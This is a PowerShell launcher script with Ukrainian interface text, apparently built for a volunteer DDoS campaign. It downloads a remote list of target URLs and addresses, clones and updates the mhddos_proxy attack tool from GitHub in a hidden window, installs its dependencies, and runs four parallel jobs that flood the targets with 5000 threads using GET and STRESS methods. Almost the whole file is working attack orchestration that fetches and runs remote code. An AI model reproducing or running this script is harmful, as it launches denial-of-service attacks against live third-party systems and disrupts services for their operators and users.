[CmdletBinding()]
param([int]$threads = 5000, [string[]]$methods = @('GET', 'STRESS'))

$ErrorActionPreference = 'Stop'
Clear-Host
# Will be necessary for Windows 7 adaptation
If ($PSVersionTable.PSVersion.Major -lt 3) {
    $PsScriptRoot = Split-Path $MyInvocation.MyCommand.Path 
}
. $PsScriptRoot\functions.ps1

$LogoTxt = Get-Content -Path "$PsScriptRoot\Logo.txt"
$LogoSize = $LogoTxt.Length
for ($i=0; $i -lt $LogoSize; $i++ ) {
    $fgColor = $i -lt ( $LogoSize/2) ? "Blue" : "Yellow"
    Write-MiddleHost $LogoTxt[$i] -ForegroundColor $fgColor -BackgroundColor 'Black'
}
Write-MiddleHost "УКРАЇНСЬКИЙ ЖНЕЦЬ"
Write-MiddleHost "Powershell v.$($PSVersionTable.PSVersion)" -ForegroundColor 'Green'

# get targets
# select lines started with http or tcp only, split them by space
# resolve ip addresses and remove duplicated (first unique persist)
# If ip was not resolved asume as unique
Write-MiddleHost "Завантаження цілей" -NoNewline
$TargetsSrc = "https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets"

# IP FILTERING:
# Slow and not confirmed. Produce less targets, some urls in the list have the same ip
# $TargetsList = ( ( Download-String -SourceUrl $TargetsSrc ) -split "\n" |
#     Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') }).Split(" ") |
#     Foreach-Object { [PsCustomObject]@{ 'address' = "$_"; 'ip' = Get-Ipv4Address -address $_ } } |
#     Sort-Object -Property 'ip' -Unique |
#     Select-Object -ExpandProperty 'address'

# URL FILTERING:
$TargetsList = ( ( Download-String -SourceUrl $TargetsSrc ) -split "\n" |
    Where-Object { ($_ -like 'http*') -or ($_ -like 'tcp://*') }).Split(" ") |
    Sort-Object -Unique

# create files with targets
$TargetFiles = 'xaa.uaripper.txt', 'xab.uaripper.txt', 'xac.uaripper.txt', 'xad.uaripper.txt'
$NumberOfTargetsFiles = $TargetFiles.Length
$NumberOfTargets = $TargetsList.Length

# little math to calculate number of entries in one file
$LnInFile = [int]($NumberOfTargets / $NumberOfTargetsFiles)
for ($i = 0; $i -lt $NumberOfTargetsFiles; $i++) {
	$s = $i * $LnInFile
    $e = ($i -ne $NumberOfTargetsFiles - 1) ? ($s + $LnInFile - 1) : ($NumberOfTargets)
    # workaround to save targets without empty line in the end of file as Unix(LF)
    ($TargetsList[$s..$e] -join "`n").Trim() | Out-File "$RootPath\tmp\$($TargetFiles[$i])" -NoNewline
}

Write-MiddleHost "Знайдено унікальних $NumberOfTargets цілей" -Here -NoNewline
$TargetsList = $null

Write-MiddleHost "Завантаження mhddos_proxy" -NoNewline
$RemoteMhddosProxy = 'https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git'
$StartParams = @{
    'FilePath' = "$RootPath\Git\cmd\git.exe"
    'Wait' = $true
    'WindowStyle' = 'Hidden'
}
if (Test-Path -Path $LocalMhddosProxy) {
    $StartParams.Add("ArgumentList", "-C $LocalMhddosProxy pull --quiet")
}
else {
    $StartParams.Add("ArgumentList", "clone $RemoteMhddosProxy $LocalMhddosProxy --quiet")
}
Start-Process @StartParams

# Write-MiddleHost "Створення та активація віртуального середовища" -Here -NoNewline
# &"$PyPath\python.exe" -m virtualenv $VenvPath #--quiet
# &"$VenvPath\Scripts\activate.ps1"

Write-MiddleHost "Завантаження додаткових компонентів mhddos_proxy" -Here -NoNewline
&"$PyPath\Scripts\python.exe" -m pip install -r "$LocalMhddosProxy\requirements.txt" #--quiet

Write-MiddleHost "Щоб завершити роботу натисніть Ctrl+C"
$strMethods = "$methods"
$BackgroundJob = { 
    $StartParams = @{
        'FilePath' = "$PyPath\Scripts\python.exe"
        'ArgumentList' = "$LocalMhddosProxy\runner.py -c $using:FilePath -t $using:threads --http-methods $using:strMethods"
        'NoNewWindow' = $true
        'PassThru' = $true
        'Wait' = $true
    }
    Start-Process @StartParams
}

try {
    $JobCount = 0
    [System.Collections.ArrayList]$jobList = @()
    foreach ($targetFile in $TargetFiles) {
        $JobCount++
        $FilePath = "$RootPath\tmp\$targetFile"
        Write-MiddleHost "Запуск Multidd$JobCount"
        $Multidd = Start-ThreadJob -ScriptBlock $BackgroundJob -Name "Multidd$JobCount"
        Receive-Job -Job $Multidd -Keep
        $null = $jobList.Add( $Multidd )
        $Multidd = $null
    }
    
    Start-Sleep -Seconds 30 # wait for 20 minutes
}
catch { $_ }
finally {
    Write-MiddleHost "Завершення роботи mhddos_proxy" -Here -NoNewline
    foreach ($Multidd in $jobList) {
        $Name = $Multidd.Name
        Receive-Job -Job $Multidd | Stop-Process -Force -ErrorAction Ignore
        if ($?) { Write-MiddleHost "Python для $Name завершено" }
        else { Write-MiddleHost "Не вдалося завершити роботу Python.exe для $Name" -ForegroundColor Red }
        Stop-job -Job $Multidd -PassThru | Remove-Job -Force
    }
}
$StartParams = @{
    'FilePath' = "$RootPath\Powershell\pwsh.exe"
    'ArgumentList' = "-ExecutionPolicy Bypass -File `"$RootPath\PsScripts\Start.ps1`""
    'NoNewWindow' = $true
    'Wait' = $false
}
Write-MiddleHost "Перезапуск"
#Start-Process @StartParams